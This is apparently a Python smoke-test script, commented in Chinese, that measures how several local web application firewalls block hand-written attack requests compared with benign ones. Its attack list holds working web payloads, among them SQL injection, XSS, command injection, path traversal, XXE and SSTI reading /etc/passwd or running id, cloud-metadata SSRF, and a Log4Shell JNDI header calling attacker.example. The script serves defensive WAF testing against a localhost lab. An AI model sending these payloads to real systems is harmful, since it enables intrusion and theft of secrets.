#!/usr/bin/env python3
"""冒烟测试：几十个手写的攻击请求和正常请求，看每个 WAF 拦了哪些。

只用标准库。完整的对比测试用 bench.sh（GoTestWAF，每个目标约 800 个请求）。
只会向本机（localhost）上的实验室端口发请求，目标地址不是本机就拒绝运行。

    python3 scripts/smoke.py            # 测所有在线的 WAF
    python3 scripts/smoke.py -v         # 逐条打印结果
"""

import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

TARGETS = {
    "无 WAF": "http://localhost:9000",
    "Coraza": "http://localhost:9001",
    "CrowdSec": "http://localhost:9002",
    "BunkerWeb": "http://localhost:9003",
    "雷池": "http://localhost:9004",
}

LOCAL_HOSTS = {"localhost", "127.0.0.1", "::1"}

BLOCK_STATUS = {403}
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) waf-lab-smoke/1.0"

# (名称, 方法, 路径, 查询参数, 额外请求头, 请求体, Content-Type)
ATTACKS = [
    ("SQL 注入：永真条件", "GET", "/search", {"q": "1' OR '1'='1' --"}, {}, None, None),
    ("SQL 注入：UNION", "GET", "/item", {"id": "1 UNION SELECT username, password FROM users"}, {}, None, None),
    ("SQL 注入：时间盲注", "GET", "/item", {"id": "1 AND SLEEP(5)"}, {}, None, None),
    ("SQL 注入：JSON 请求体", "POST", "/api/login", {}, {}, '{"user": "admin\' --", "pass": "x"}', "application/json"),
    ("XSS：script 标签", "GET", "/search", {"q": "<script>alert(document.cookie)</script>"}, {}, None, None),
    ("XSS：事件属性", "GET", "/search", {"q": '<img src=x onerror="alert(1)">'}, {}, None, None),
    ("XSS：javascript: 链接", "GET", "/go", {"url": "javascript:alert(1)"}, {}, None, None),
    ("路径穿越", "GET", "/download", {"file": "../../../../etc/passwd"}, {}, None, None),
    ("命令注入", "GET", "/ping", {"host": "127.0.0.1; cat /etc/passwd"}, {}, None, None),
    ("命令注入：反引号", "GET", "/ping", {"host": "`id`"}, {}, None, None),
    ("Log4Shell 请求头", "GET", "/", {}, {"X-Api-Version": "${jndi:ldap://attacker.example/a}"}, None, None),
    ("SSRF：云元数据", "GET", "/fetch", {"url": "http://169.254.169.254/latest/meta-data/"}, {}, None, None),
    ("PHP 伪协议", "GET", "/page", {"file": "php://filter/convert.base64-encode/resource=index.php"}, {}, None, None),
    ("读取 .env", "GET", "/.env", {}, {}, None, None),
    ("读取 .git/config", "GET", "/.git/config", {}, {}, None, None),
    ("扫描器 UA", "GET", "/", {}, {"User-Agent": "sqlmap/1.8#stable (https://sqlmap.org)"}, None, None),
    ("XXE", "POST", "/api/xml", {}, {},
     '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>', "application/xml"),
    ("SSTI", "GET", "/hello", {"name": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"}, {}, None, None),
]

BENIGN = [
    ("普通搜索", "GET", "/search", {"q": "best running shoes 2026"}, {}, None, None),
    ("中文搜索", "GET", "/search", {"q": "如何选择 WAF 防火墙"}, {}, None, None),
    ("带撇号的姓名", "GET", "/user", {"name": "Conan O'Brien"}, {}, None, None),
    ("含 SQL 单词的句子", "GET", "/search", {"q": "select a size from the menu and update your order"}, {}, None, None),
    ("邮箱地址", "GET", "/subscribe", {"email": "alice+news@example.com"}, {}, None, None),
    ("跳转链接参数", "GET", "/login", {"next": "https://example.com/dashboard?tab=1&sort=desc"}, {}, None, None),
    ("数学表达式", "GET", "/calc", {"expr": "(3+4)*2=14"}, {}, None, None),
    ("长 token", "GET", "/verify", {"token": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"}, {}, None, None),
    ("JSON API", "POST", "/api/orders", {}, {}, '{"user": "alice", "items": [1, 2, 3], "note": "leave at door"}', "application/json"),
    ("表单提交", "POST", "/contact", {}, {}, "name=Bob&message=Hi%2C+I+love+your+product%21", "application/x-www-form-urlencoded"),
    ("带符号的密码", "POST", "/login", {}, {}, "user=bob&password=P%40ss%27w0rd%3B--x", "application/x-www-form-urlencoded"),
    ("技术论坛：命令示例", "POST", "/forum/reply", {}, {},
     '{"body": "Try running `ls -la /var/log` then check the output"}', "application/json"),
    ("技术论坛：HTML 示例", "POST", "/forum/reply", {}, {},
     '{"body": "Wrap it in <b>bold</b> or use <em>emphasis</em>"}', "application/json"),
    ("技术论坛：SQL 示例", "POST", "/forum/reply", {}, {},
     '{"body": "My query is SELECT name FROM users WHERE id = 1, why is it slow?"}', "application/json"),
]


def send(base, case, timeout):
    _, method, path, params, headers, body, ctype = case
    url = base + path
    if params:
        url += "?" + urllib.parse.urlencode(params)
    data = body.encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("User-Agent", UA)
    if ctype:
        req.add_header("Content-Type", ctype)
    for k, v in headers.items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status
    except urllib.error.HTTPError as e:
        return e.code
    except (urllib.error.URLError, TimeoutError, ConnectionError):
        return None


def online(base):
    try:
        urllib.request.urlopen(urllib.request.Request(base + "/", headers={"User-Agent": UA}), timeout=3)
        return True
    except urllib.error.HTTPError:
        return True
    except (urllib.error.URLError, TimeoutError, ConnectionError):
        return False


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-v", "--verbose", action="store_true", help="逐条打印每个请求的结果")
    ap.add_argument("--json", metavar="FILE", help="把结果另存为 JSON")
    ap.add_argument("--timeout", type=float, default=10)
    args = ap.parse_args()

    for name, base in TARGETS.items():
        if urllib.parse.urlsplit(base).hostname not in LOCAL_HOSTS:
            sys.exit(f"{name} 的地址 {base} 不是本机，拒绝运行。这个脚本只测本机实验室。")

    targets = {name: base for name, base in TARGETS.items() if online(base)}
    skipped = [name for name in TARGETS if name not in targets]
    if not targets:
        sys.exit("没有在线的目标。先运行 ./waflab run")

    results = {}
    for name, base in targets.items():
        results[name] = {
            "attacks": [(c[0], send(base, c, args.timeout)) for c in ATTACKS],
            "benign": [(c[0], send(base, c, args.timeout)) for c in BENIGN],
        }

    if args.verbose:
        names = list(targets)
        for title, key in (("攻击请求（应拦截）", "attacks"), ("正常请求（应放行）", "benign")):
            print(f"\n{title}")
            print("  " + pad("用例", 24) + "".join(pad(n, 12) for n in names))
            cases = ATTACKS if key == "attacks" else BENIGN
            for i, case in enumerate(cases):
                row = []
                for n in names:
                    status = results[n][key][i][1]
                    blocked = status in BLOCK_STATUS
                    mark = "拦截" if blocked else ("放行" if status else "失败")
                    row.append(pad(f"{mark} {status or '-'}", 12))
                print("  " + pad(case[0], 24) + "".join(row))

    print("\n" + pad("目标", 12) + pad("攻击拦截", 12) + "正常误拦")
    for name in targets:
        a = results[name]["attacks"]
        b = results[name]["benign"]
        blocked = sum(1 for _, s in a if s in BLOCK_STATUS)
        false_pos = sum(1 for _, s in b if s in BLOCK_STATUS)
        print(pad(name, 12) + pad(f"{blocked}/{len(a)}", 12) + f"{false_pos}/{len(b)}")
    if skipped:
        print(f"\n未在线，已跳过：{'、'.join(skipped)}")
        if "雷池" in skipped:
            print("雷池需要先 ./waflab safeline，再在控制台里添加站点（见 README）")

    if args.json:
        with open(args.json, "w") as f:
            json.dump(results, f, ensure_ascii=False, indent=2)


def pad(text, width):
    """按显示宽度补空格（中文字符占两格）。"""
    shown = sum(2 if ord(ch) > 0x2E7F else 1 for ch in text)
    return text + " " * max(width - shown, 1)


if __name__ == "__main__":
    main()
